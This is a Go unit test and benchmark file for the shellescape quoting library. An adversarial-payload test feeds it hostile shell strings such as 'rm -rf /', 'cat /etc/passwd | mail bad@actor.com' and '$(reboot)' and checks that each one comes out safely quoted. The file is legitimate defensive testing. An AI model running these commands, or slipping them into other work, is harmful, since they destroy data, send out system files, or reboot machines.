package shellescape_test

import (
	"bufio"
	"bytes"
	"strings"
	"testing"

	"al.essio.dev/pkg/shellescape"
)

func assertEqual(t *testing.T, s, expected string) {
	t.Helper()

	if s != expected {
		t.Fatalf("%q (expected: %q)", s, expected)
	}
}

func TestEmptyString(t *testing.T) {
	s := shellescape.Quote("")
	expected := "''"
	assertEqual(t, s, expected)
}

func TestDoubleQuotedString(t *testing.T) {
	s := shellescape.Quote(`"double quoted"`)
	expected := `'"double quoted"'`
	assertEqual(t, s, expected)
}

func TestSingleQuotedString(t *testing.T) {
	s := shellescape.Quote(`'single quoted'`)
	expected := `''"'"'single quoted'"'"''`
	assertEqual(t, s, expected)
}

func TestUnquotedString(t *testing.T) {
	s := shellescape.Quote(`no quotes`)
	expected := `'no quotes'`
	assertEqual(t, s, expected)
}

func TestSingleInvalid(t *testing.T) {
	s := shellescape.Quote(`;`)
	expected := `';'`
	assertEqual(t, s, expected)
}

func TestBacktick(t *testing.T) {
	s := shellescape.Quote("`echo hello`")
	expected := "'`echo hello`'"
	assertEqual(t, s, expected)
}

func TestAllInvalid(t *testing.T) {
	s := shellescape.Quote(`;${}`)
	expected := `';${}'`
	assertEqual(t, s, expected)
}

func TestSecurityAdversarialPayloads(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{"empty string", "", "''"},
		{"command separator semicolon", "; rm -rf / ;", "'; rm -rf / ;'"},
		{"command separator AND", "foo && bar", "'foo && bar'"},
		{"command separator OR", "foo || bar", "'foo || bar'"},
		{"pipe operator", "cat /etc/passwd | mail bad@actor.com", "'cat /etc/passwd | mail bad@actor.com'"},
		{"subshell dollar parens", "$(reboot)", "'$(reboot)'"},
		{"subshell backticks", "`id`", "'`id`'"},
		{"nested subshell", "`echo $(whoami)`", "'`echo $(whoami)`'"},
		{"variable expansion simple", "$PATH", "'$PATH'"},
		{"variable expansion braced", "${HOME}", "'${HOME}'"},
		{"single quote alone", "'", `''"'"''`},
		{"triple single quotes", "'''", `''"'"''"'"''"'"''`},
		{"nested single quotes in text", "don't say 'never'", `'don'"'"'t say '"'"'never'"'"''`},
		{"double quotes in text", `"quoted"`, `'"quoted"'`},
		{"mixed quotes", `'\"'`, `''"'"'\"'"'"''`},
		{"newlines and tabs", "foo\nbar\tbaz", "'foo\nbar\tbaz'"},
		{"wildcards and globs", "* ? [a-z] {1..10}", "'* ? [a-z] {1..10}'"},
		{"redirection", "> /dev/null 2>&1", "'> /dev/null 2>&1'"},
		{"process substitution", "<(ls -la)", "'<(ls -la)'"},
		{"backslash paths", `C:\Program Files\App\`, `'C:\Program Files\App\'`},
		{"multibyte utf8", "こんにちは世界 🚀", "'こんにちは世界 🚀'"},
	}

	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			got := shellescape.Quote(tt.input)
			assertEqual(t, got, tt.expected)
		})
	}
}

func TestCleanString(t *testing.T) {
	s := shellescape.Quote("foo.example.com")
	expected := `foo.example.com`
	assertEqual(t, s, expected)
}

func TestQuoteCommand(t *testing.T) {
	s := shellescape.QuoteCommand([]string{"ls", "-l", "file with space"})
	expected := `ls -l 'file with space'`
	assertEqual(t, s, expected)
}

func TestStripUnsafe(t *testing.T) {
	type args struct {
		s string
	}
	tests := []struct {
		name string
		args args
		want string
	}{
		{"all ASCII printable characters", args{`"printable!" characters '' 12321312"`}, `"printable!" characters '' 12321312"`},
		{"some non printable characters", args{"print\u0081ble"}, "printble"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := shellescape.StripUnsafe(tt.args.s); got != tt.want {
				t.Errorf("StripUnsafe() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestStripSpaces(t *testing.T) {
	t.Parallel()
	type args struct {
		s string
	}
	tests := []struct {
		name string
		args args
		want string
	}{
		{"no spaces", args{`"printable!" characters '' 12321312"`}, `"printable!"characters''12321312"`},
		{"some spaces", args{"print able"}, "printable"},
		{"leading and trailing spaces", args{"   print able   "}, "printable"},
		{"only spaces", args{"   "}, ""},
	}
	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t2 *testing.T) {
			t2.Parallel()
			got := shellescape.StripSpaces(tt.args.s)
			assertEqual(t2, got, tt.want)
		})
	}
}

func TestScanTokens(t *testing.T) {
	data := [][]byte{[]byte("foo"), []byte("bar"), []byte("baz")}
	buf := bytes.NewBuffer(bytes.Join(data, []byte{'\x00'}))
	want := []string{"foo", "bar", "baz"}

	scanner := bufio.NewScanner(buf)
	scanner.Split(shellescape.ScanTokens)

	for i := 0; scanner.Scan(); i++ {
		if got := scanner.Text(); got != want[i] {
			t.Errorf("scanner.Text() = %v, want %v", got, want[i])
		}
	}

	if err := scanner.Err(); err != nil {
		t.Errorf("scanner.Err() = %v, want nil", err)
	}
}

func BenchmarkQuote(b *testing.B) {
	s := "test string with 'single quotes' and \"double quotes\""
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		shellescape.Quote(s)
	}
}

func BenchmarkQuoteCommand(b *testing.B) {
	args := []string{"ls", "-l", "file with space"}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		shellescape.QuoteCommand(args)
	}
}

func BenchmarkStripUnsafe(b *testing.B) {
	s := "test string with non-printable characters\u0081 and spaces   "
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		shellescape.StripUnsafe(s)
	}
}

func BenchmarkScanTokens(b *testing.B) {
	data := [][]byte{[]byte("foo"), []byte("bar"), []byte("baz")}
	buf := bytes.NewBuffer(bytes.Join(data, []byte{'\x00'}))
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		scanner := bufio.NewScanner(buf)
		scanner.Split(shellescape.ScanTokens)
		for scanner.Scan() {
			_ = scanner.Text()
		}
		if err := scanner.Err(); err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkQuoteLargeString(b *testing.B) {
	s := strings.Repeat("test string with 'single quotes' and \"double quotes\"", 1000)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		shellescape.Quote(s)
	}
}

func BenchmarkQuoteCommandLargeArgs(b *testing.B) {
	args := make([]string, 1000)
	for i := range args {
		args[i] = "arg with space"
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		shellescape.QuoteCommand(args)
	}
}

func BenchmarkStripUnsafeLargeString(b *testing.B) {
	s := strings.Repeat("test string with non-printable characters\u0081 and spaces   ", 1000)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		shellescape.StripUnsafe(s)
	}
}

func BenchmarkScanTokensLargeData(b *testing.B) {
	data := make([][]byte, 1000)
	for i := range data {
		data[i] = []byte("foo")
	}
	joined := bytes.Join(data, []byte{'\x00'})
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		buf := bytes.NewBuffer(joined)
		scanner := bufio.NewScanner(buf)
		scanner.Split(shellescape.ScanTokens)
		for scanner.Scan() {
			_ = scanner.Text()
		}
		if err := scanner.Err(); err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkStripSpaces(b *testing.B) {
	s := "test string with spaces   "
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		shellescape.StripSpaces(s)
	}
}

func BenchmarkStripSpacesLargeString(b *testing.B) {
	s := strings.Repeat("test string with spaces   ", 1000)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		shellescape.StripSpaces(s)
	}
}
